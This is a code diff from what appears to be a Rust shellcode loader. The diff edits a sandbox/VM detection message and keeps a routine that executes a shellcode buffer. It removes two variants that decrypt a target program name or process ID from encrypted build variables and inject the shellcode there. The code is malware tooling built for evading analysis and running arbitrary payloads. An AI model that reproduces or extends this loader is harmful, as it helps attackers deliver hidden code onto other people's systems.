@@ -49,7 +49,7 @@ fn main() {
         exit_program();
     } else {
         #[cfg(feature = "debug")] 
-        print_message("Pass Sandbox/VM detection.");
+        print_message("Passed Sandbox/VM detection.");
     }
 
     #[cfg(feature = "with_bundling")]
@@ -94,35 +94,10 @@ fn main() {
             }
         };
 
-        #[cfg(feature = "pattern1")]
         if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len) {
             #[cfg(feature = "debug")]
             print_error("Failed to execute:", &_e);
             exit_program();
-        }
-        
-        #[cfg(feature = "pattern2")] 
-        {
-            use utils::simple_decrypt;
-            let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
-
-            if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len, target_program.as_str()) {
-                #[cfg(feature = "debug")]
-                print_error("Failed to execute:", &_e);
-                exit_program();
-            }
-        }
-        
-        #[cfg(feature = "pattern3")]
-        {
-            use utils::simple_decrypt;
-            let pid: usize = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PID")).parse().unwrap_or(0);
-            
-            if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len, pid) {
-                #[cfg(feature = "debug")]
-                print_error("Failed to execute:", &_e);
-                exit_program();
-            }
         }
     }
     
